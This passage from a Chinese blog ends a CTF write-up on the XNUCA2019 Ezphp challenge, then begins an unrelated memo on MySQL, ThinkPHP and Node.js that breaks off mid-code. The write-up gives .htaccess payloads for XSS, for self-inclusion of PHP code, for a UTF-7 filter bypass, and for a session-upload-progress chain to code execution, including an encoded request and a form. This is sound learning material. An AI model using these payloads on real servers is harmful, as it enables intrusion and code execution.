<p>这个规则的意思是设置了/var/www目录下的文件是受.htaccess文件的影响</p>
<p>sites-enabled下的000-default.conf</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjw3aF.png" alt="mjw3aF.png"></p>
<p>这个配置的规则意思是首先关闭的php的解析引擎，再对index.php设置特定的规则，同样设置index.php不受htaccess的影响，并且对index.php开启php的解析引擎。</p>
<p>这里是有多个规则同时作用于/var/www下的文件的，后来问了一下出题的师傅，得知docker-php.conf的优先级要更高一些，所以最终生效的是docker-php.conf的配置规则，所以/var/www目录下是受htaccess影响的。</p>
<p>所以之前的那几个疑惑点也就都弄清了</p>
<ul>
<li>php文件只有index.php解析而其他的文件却不解析：是因为php解析引擎关闭，而000-default.conf文件中只对index.php添加了规则使得index.php正常解析。</li>
<li>AddType application/x-httpd-php .txt这类规则无法生效：同样因为php引擎关闭，无法正常解析</li>
</ul>
<h3 id="htaccess拓展"><a href="#htaccess拓展" class="headerlink" title=".htaccess拓展"></a>.htaccess拓展</h3><h4 id="设置-htaccess实现xss攻击"><a href="#设置-htaccess实现xss攻击" class="headerlink" title="设置.htaccess实现xss攻击"></a>设置.htaccess实现xss攻击</h4><p>.htaccess添加内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php_value highlight.comment <span class="string">'"&gt;&lt;script&gt;alert(1);&lt;/script&gt;'</span></span><br></pre></td></tr></table></figure>

<p>效果如下</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjDS29.png" alt="mjDS29.png"></p>
<p>经实验验证以下配置修改都可以实现xss攻击</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mj5DXT.png" alt="mj5DXT.png"></p>
<h4 id="通过htaccess实现文件包含拿到后门"><a href="#通过htaccess实现文件包含拿到后门" class="headerlink" title="通过htaccess实现文件包含拿到后门"></a>通过htaccess实现文件包含拿到后门</h4><h5 id="无对htaccess内容检验时"><a href="#无对htaccess内容检验时" class="headerlink" title="无对htaccess内容检验时"></a>无对htaccess内容检验时</h5><p>在htaccess中添加如下内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php_value auto_append_file .htaccess</span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?php phpinfo();</span></span><br></pre></td></tr></table></figure>

<p>访问任意php文件</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjsA9e.png" alt="mjsA9e.png"></p>
<h5 id="有对htaccess内容检验时"><a href="#有对htaccess内容检验时" class="headerlink" title="有对htaccess内容检验时"></a>有对htaccess内容检验时</h5><p>如对&lt;?进行检验，我们可以通过utf7编码来绕过</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjcHKJ.png" alt="mjcHKJ.png"></p>
<h4 id="通过设置htaccess规则拿到源码"><a href="#通过设置htaccess规则拿到源码" class="headerlink" title="通过设置htaccess规则拿到源码"></a>通过设置htaccess规则拿到源码</h4><p>在htaccess添加规则如下，使得php解析引擎关闭，得到文件源码</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjgHW8.png" alt="mjgHW8.png"></p>
<h3 id="最后的一些思考"><a href="#最后的一些思考" class="headerlink" title="最后的一些思考"></a>最后的一些思考</h3><p>看了一些php.ini的东西，感觉是会有第四种做法的,就尝试了一下(其实和前三种差不多</p>
<p>最后看php.ini的信息的时候随手翻了一下，发现如下四个配置，而且发现都可以通过htaccess控制</p>
<p><img src="https://s2.ax1x.com/2019/08/30/mjIr8I.png" alt="mjIr8I.png"></p>
<p>仔细思考了一下，想到了可以<code>POST</code>一个与<code>session.upload_progress.name</code>同名的变量，这个变量对应的值就会被记录到<code>session</code>文件中，那么我们再去包含这个session，那么也可以getshell的这种做法。</p>
<p>但是这道题没设session，看了一会配置信息，发现上面有一个配置是<code>session.auto_start</code>,这个配置的意思相当于自动开启session_start，那么这样就很好办了，首先设置htaccess文件内容如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php_value session.auto_start <span class="number">1</span></span><br><span class="line">php_value session.upload_progress.cleanup <span class="number">0</span></span><br><span class="line">php_value session.upload_progress.enabled <span class="number">1</span></span><br><span class="line">php_value session.save_path <span class="string">"/tmp"</span></span><br><span class="line">php_value auto_prepend_file <span class="string">"/tmp/sess_123"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># \</span></span><br></pre></td></tr></table></figure>

<p>对应payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename&#x3D;.htaccess&amp;content&#x3D;php_value%20sessio%5C%0An.auto_start%201%0Aphp_value%20sessio%5C%0An.up%5C%0Aload_progress.cleanup%200%0Aphp_value%20sessio%5C%0An.uplo%5C%0Aad_progress.enabled%201%0Aphp_value%20sessio%5C%0An.save_path%20%22%2Ftmp%22%0Aphp_value%20auto_prepend_fi%5C%0Ale%20%22%2Ftmp%2Fsess_123%22%0A%23%20%5C</span><br></pre></td></tr></table></figure>

<p>第二步通过表单把shell语句加在session文件中</p>
<p>表单如下</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://4b94737b-7d77-493d-b119-6ab89c8ef450.node1.buuoj.cn"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">vaule</span>=<span class="string">"&lt;?php phpinfo(); ?&gt;"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file1"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file2"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里用的buuoj这个平台(很好用,推荐一下)，抓包在burp中加一下PHPSESSID</p>
<p><img src="https://s2.ax1x.com/2019/08/31/mvNlGR.png" alt="mvNlGR.png"></p>
<p>这时上一次我们的配置就生效的了，添加PHPSESSID后也就直接被包含了，执行了我们的php代码</p>
<p><img src="https://s2.ax1x.com/2019/08/31/mvNjY9.png" alt="mvNjY9.png"></p>
<p>其实这个解法和前面的原理思路也都是差不多的，只是想记录一下萌新的一些想法。</p>
<p>文章如果不足之处，还请师傅们指出</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://www.hackdig.com/02/hack-18445.htm" target="_blank" rel="noopener">http://www.hackdig.com/02/hack-18445.htm</a></p>
<p><a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a></p>
<p><a href="https://php.golaravel.com/ini.list.html" target="_blank" rel="noopener">https://php.golaravel.com/ini.list.html</a></p>
<p><a href="https://httpd.apache.org/docs/current/howto/htaccess.html" target="_blank" rel="noopener">https://httpd.apache.org/docs/current/howto/htaccess.html</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/09/23/XNUCA2019-Ezphp/" data-id="ckabsu38v002pkkvr6d8ie0wq" class="article-share-link" data-share="baidu" data-title="XNUCA2019-Ezphp">Share</a>
      

      
        <a href="http://yoursite.com/2019/09/23/XNUCA2019-Ezphp/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-备忘录" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/09/23/%E5%A4%87%E5%BF%98%E5%BD%95/" class="article-date">
  <time datetime="2019-09-23T04:23:06.000Z" itemprop="datePublished">2019-09-23</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/09/23/%E5%A4%87%E5%BF%98%E5%BD%95/">备忘录</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Mysql一些基本操作"><a href="#Mysql一些基本操作" class="headerlink" title="Mysql一些基本操作"></a>Mysql一些基本操作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">drop table if exists  &#96;user&#96;;</span><br><span class="line"></span><br><span class="line">create table &#96;user&#96; (</span><br><span class="line">    &#96;id&#96; int(32) primary key auto_increment,</span><br><span class="line">    &#96;username&#96; varchar(40) not null,</span><br><span class="line">    &#96;password&#96; varchar(40) not null</span><br><span class="line">) ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 ;</span><br><span class="line"></span><br><span class="line">insert into &#96;user&#96; (&#96;id&#96;,&#96;username&#96;,&#96;password&#96;) values (&#39;1&#39;,&#39;admin&#39;,&#39;__FLAG__&#39;);</span><br><span class="line">drop table if exists &#96;html&#96;;</span><br><span class="line"></span><br><span class="line">create table &#96;html&#96; (</span><br><span class="line">    &#96;id&#96; int(32) primary key  auto_increment,</span><br><span class="line">    &#96;userid&#96; int(32) not null,</span><br><span class="line">    &#96;dom&#96; text not null</span><br><span class="line">)ENGINE&#x3D;InnoDB DEFAULT CHARSET&#x3D;utf8 ;</span><br></pre></td></tr></table></figure>

<h3 id="IDE基本调试操作"><a href="#IDE基本调试操作" class="headerlink" title="IDE基本调试操作"></a>IDE基本调试操作</h3><p>step into：单步执行，遇到子函数就进入并且继续单步执行（简而言之，进入子函数），一句一句代码执行，类似VS中的逐语句；</p>
<p>step over：在单步执行时，在函数内遇到子函数时不会进入子函数内单步执行，而是将子函数整个执行完再停止，也就是把子函数整个作为一步。有一点,经过我们简单的调试，在不存在子函数的情况下是和step into效果一样的（简而言之，越过子函数，但子函数会执行），类似VS中的逐过程。</p>
<p>step out：当单步执行到子函数内时，用step out就可以执行完子函数余下部分，并返回到上一层函数，可以理解为执行完当前模块并跳出。</p>
<h3 id="Thinkphp备忘"><a href="#Thinkphp备忘" class="headerlink" title="Thinkphp备忘"></a>Thinkphp备忘</h3><h4 id="Thinkphp安装"><a href="#Thinkphp安装" class="headerlink" title="Thinkphp安装"></a>Thinkphp安装</h4><p>利用composer安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink&#x2F;think&#x3D;5.1.* tp5</span><br></pre></td></tr></table></figure>

<p>通过上面的安装命令即可在tp5子目录生成项目文件</p>
<h4 id="Thinkphp目录结构"><a href="#Thinkphp目录结构" class="headerlink" title="Thinkphp目录结构"></a>Thinkphp目录结构</h4><p><a href="https://blog.csdn.net/jimo_lonely/article/details/52958751" target="_blank" rel="noopener">https://blog.csdn.net/jimo_lonely/article/details/52958751</a></p>
<p>这里用的是thinkphp5.1，目录结构如下</p>
<p><img src="https://s2.ax1x.com/2019/09/06/nuOBB4.png" alt="nuOBB4.png"></p>
<p>简单说一下各个目录的作用</p>
<ul>
<li>application: 应用目录</li>
<li>config: 配置文件</li>
<li>extend: 非composer下载的php第三方库，而是由自己定义的第三方类</li>
<li>public: 访问入口</li>
<li>route: 路由</li>
<li>runtime: 包括框架运行的日志和缓存文件（可以用来调错</li>
<li>think: 框架核心，包含很多核心类库</li>
<li>vendor: composer下载的第三方库</li>
</ul>
<h4 id="extend与vendor"><a href="#extend与vendor" class="headerlink" title="extend与vendor"></a>extend与vendor</h4><p>extend与vendor区别如下：</p>
<p>extend是自己定义的类文件，而vendor大部分都是composer类库文件，二者的引用方式分别为：</p>
<p>extend主要通过use来引用，使用例子如下：</p>
<p>在extend/test/Foo.php，写入Foo类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">test</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Foo</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">h1llo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'HEllo lihuaiqiu'</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在controller中进行引入调用此自定义类的h1llo函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">test</span>\<span class="title">Foo</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $foo=<span class="keyword">new</span> Foo();</span><br><span class="line">    <span class="keyword">return</span> $foo-&gt;h1llo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过路由成功访问</p>
<p><a href="http://127.0.0.1/tp5/public/index.php/index/index/test1" target="_blank" rel="noopener">http://127.0.0.1/tp5/public/index.php/index/index/test1</a></p>
<p>vender的使用方法其实和extend差不多，可通过Import或者vender两个助手函数进行加载</p>
<p>第三方类位于</p>
<p>vendor/lib/cwb.php</p>
<p>通过以下语句进行调用</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import(<span class="string">'lib.cwb'</span>,VENDOR_PATH,<span class="string">'.class.php'</span>);</span><br></pre></td></tr></table></figure>

<p>实例化：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$obj = <span class="keyword">new</span>  \Cwb();</span><br></pre></td></tr></table></figure>

<p>详细参考连接<a href="https://blog.csdn.net/qq_42728978/article/details/82428083" target="_blank" rel="noopener">https://blog.csdn.net/qq_42728978/article/details/82428083</a></p>
<p><a href="http://www.zhangkeda.com/archives/96.html" target="_blank" rel="noopener">http://www.zhangkeda.com/archives/96.html</a></p>
<h4 id="模板与视图"><a href="#模板与视图" class="headerlink" title="模板与视图"></a>模板与视图</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">test</span>\<span class="title">Foo</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> view(<span class="string">'test'</span>);</span><br><span class="line">        </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过view函数将同模块下/view/控制器名字/参数.html渲染，在无参数的情况下渲染为同模块下/view/控制器名字/方法名.html</p>
<p>admin模块渲染测试</p>
<p><img src="https://s2.ax1x.com/2019/09/06/nK4A9e.png" alt="nK4A9e.png"></p>
<h4 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h4><p>Thinkphp中给了两种数据库操作的的方法，第一种操作方法是利用db类，第二种方法是利用model</p>
<h5 id="db类操作数据库"><a href="#db类操作数据库" class="headerlink" title="db类操作数据库"></a>db类操作数据库</h5><p>首先在config/app.php配置一下自己数据库的基本信息，通过如下调用即可进行数据操作</p>
<p><img src="https://s2.ax1x.com/2019/09/06/nKXpk9.png" alt="nKXpk9.png"></p>
<h5 id="Model进行数据库操作"><a href="#Model进行数据库操作" class="headerlink" title="Model进行数据库操作"></a>Model进行数据库操作</h5><p>Model其实为数据表的抽象描述，主要用于操作相应的数据表(表对应的类goods.class.php、category.class.php、user.class.php)</p>
<p>首先建立model文件夹，在model中写入AdminUser类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminUser</span> <span class="keyword">extends</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $table=<span class="string">'tp_user'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $pk = <span class="string">'id'</span>;</span><br></pre></td></tr></table></figure>

<p>在controller中调用取出数据</p>
<p><img src="https://s2.ax1x.com/2019/09/06/nMS3dO.png" alt="nMS3dO.png"></p>
<p>通过Model,controller,view三个层构造了MVC模式：</p>
<ul>
<li>用户首先通过View层输入数据</li>
<li>controller通过Model的调用来进行数据操作并且取出数据</li>
<li>controller取出的数据再交给View层，通过View来将用户想要查看的数据输出。</li>
</ul>
<p><a href="https://www.cnblogs.com/yifangtongxing/p/5512032.html" target="_blank" rel="noopener">https://www.cnblogs.com/yifangtongxing/p/5512032.html</a></p>
<h3 id="Python-Requests上传文件"><a href="#Python-Requests上传文件" class="headerlink" title="Python Requests上传文件"></a>Python Requests上传文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'name'</span>: <span class="string">'nginx'</span></span><br><span class="line">&#125;</span><br><span class="line">files = &#123;<span class="string">'file'</span>: open(<span class="string">"abc.csv"</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=data, files=files)</span><br></pre></td></tr></table></figure>

<h3 id="Nodejs篇"><a href="#Nodejs篇" class="headerlink" title="Nodejs篇"></a>Nodejs篇</h3><h4 id="简单应用创建"><a href="#简单应用创建" class="headerlink" title="简单应用创建"></a>简单应用创建</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span> (<span class="params">request, response</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送 HTTP 头部</span></span><br><span class="line"><span class="comment">// HTTP 状态值: 200 : OK</span></span><br><span class="line"><span class="comment">// 内容类型: text/plain</span></span><br><span class="line">response.writeHead(<span class="number">200</span>, &#123;<span class="string">'Content-Type'</span>: <span class="string">'image/png'</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送响应数据 "Hello World"</span></span><br><span class="line">response.end(<span class="string">'Hello World\n'</span>);</span><br><span class="line"></span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终端打印如下信息</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Server running at http://127.0.0.1:8888/'</span>);</span><br></pre></td></tr></table></figure>

<p>引入http模块，创建服务器，并设置返回文件类型为image/png，并且返回内容Hello World</p>
<h4 id="npm常用命令"><a href="#npm常用命令" class="headerlink" title="npm常用命令"></a>npm常用命令</h4><p>还是cnpm比较好，速度更快一些</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">npm ls</span><br><span class="line"></span><br><span class="line">npm unintsall</span><br><span class="line"></span><br><span class="line">npm update</span><br><span class="line"></span><br><span class="line">npm search</span><br><span class="line"></span><br><span class="line">npm init(创建package.json)</span><br></pre></td></tr></table></figure>

<h4 id="回调函数与异步编程"><a href="#回调函数与异步编程" class="headerlink" title="回调函数与异步编程"></a>回调函数与异步编程</h4><p>阻塞与非阻塞—–阻塞需要按顺序执行，而非阻塞则不需要，通过非阻塞可以不需要等待上面程序执行完毕，直接去执行下面的，也就是异步。在nodejs里的fs模块有两个函数</p>
<ul>
<li>同步：readFileSync函数</li>
<li>异步：readFile函数</li>
</ul>
<p>如下两种代码即可输出不同效果</p>
<p>异步</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'input.txt'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="built_in">console</span>.error(err);</span><br><span class="line">    <span class="built_in">console</span>.log(data.toString());  <span class="comment">//后显示文件读取结果</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"程序执行结束!"</span>);</span><br></pre></td></tr></table></figure>

<p>同步</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">"fs"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data = fs.readFileSync(<span class="string">'input.txt'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(data.toString());   <span class="comment">//先显示文件读取结果</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"程序执行结束!"</span>);</span><br></pre></td></tr></table></figure>

<p>Node.js 是单进程单线程应用程序，但是因为 V8 引擎提供的异步执行回调接口，通过这些接口可以处理大量的并发，所以性能非常高。详细解释如下</p>
<p>目前对事件循环的理解还是比较浅，作用就是通过v8的异步执行回调接口处理并发，补足了javascript是单线程的缺点</p>
<p><a href="http://lynnelv.github.io/js-event-loop-nodejs这篇文章剖析的比较详细，等有机会的时候单独写一篇文章剖析一下Node.js的事件循环。" target="_blank" rel="noopener">http://lynnelv.github.io/js-event-loop-nodejs这篇文章剖析的比较详细，等有机会的时候单独写一篇文章剖析一下Node.js的事件循环。</a></p>
<h4 id="EventEmitter"><a href="#EventEmitter" class="headerlink" title="EventEmitter"></a>EventEmitter</h4><p><a href="https://www.runoob.com/nodejs/nodejs-event.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-event.html</a></p>
<p>主要就是创建绑定监听器，并且通过emit触发事件，去调用回调函数</p>
<p>其实看到这里，大概对事件循环的理解就是</p>
<p><strong>事件循环的监听器是一个主循环，当检测到异步事件的时候就会去触发回调函数</strong>，还是等以后结合底层源码单独去剖析一下事件循环这个有趣的东西吧</p>
<h4 id="Buffer缓冲区处理Tcp或文件流等二进制数据"><a href="#Buffer缓冲区处理Tcp或文件流等二进制数据" class="headerlink" title="Buffer缓冲区处理Tcp或文件流等二进制数据"></a>Buffer缓冲区处理Tcp或文件流等二进制数据</h4><p><a href="https://www.runoob.com/nodejs/nodejs-buffer.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-buffer.html</a></p>
<h4 id="常见流操作"><a href="#常见流操作" class="headerlink" title="常见流操作"></a>常见流操作</h4><ul>
<li>从流中读取数据</li>
<li>写入文件</li>
<li>管道流—从一个输出流到另一个输入流</li>
<li>链式流—-解压和压缩文件</li>
</ul>
<p><a href="https://www.runoob.com/nodejs/nodejs-stream.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-stream.html</a></p>
<h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p><a href="https://imgchr.com/i/nUo6zQ" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/09/10/nUo6zQ.png" alt="nUo6zQ.png"></a></p>
<p>自行封装并进行引入。</p>
<h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">execute</span>(<span class="params">someFunction, value</span>) </span>&#123;</span><br><span class="line">  someFunction(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">execute(<span class="function"><span class="keyword">function</span>(<span class="params">word</span>)</span>&#123; <span class="built_in">console</span>.log(word) &#125;, <span class="string">"Hello"</span>);</span><br></pre></td></tr></table></figure>

<p>将函数作为变量传递—我们不需要为这个函数起名字—-匿名函数</p>
<p>创建http服务的代码也是调用匿名函数的过程</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">"http"</span>);</span><br><span class="line"></span><br><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>) </span>&#123;</span><br><span class="line">  response.writeHead(<span class="number">200</span>, &#123;<span class="string">"Content-Type"</span>: <span class="string">"text/plain"</span>&#125;);</span><br><span class="line">  response.write(<span class="string">"Hello World"</span>);</span><br><span class="line">  response.end();</span><br><span class="line">&#125;).listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>

<h4 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h4><p><a href="https://www.runoob.com/nodejs/nodejs-router.html" target="_blank" rel="noopener">https://www.runoob.com/nodejs/nodejs-router.html</a></p>
<h4 id="Util模块"><a href="#Util模块" class="headerlink" title="Util模块"></a>Util模块</h4><p>这里简写两个函数</p>
<h5 id="util-inherits"><a href="#util-inherits" class="headerlink" title="util.inherits"></a>util.inherits</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> util = <span class="built_in">require</span>(<span 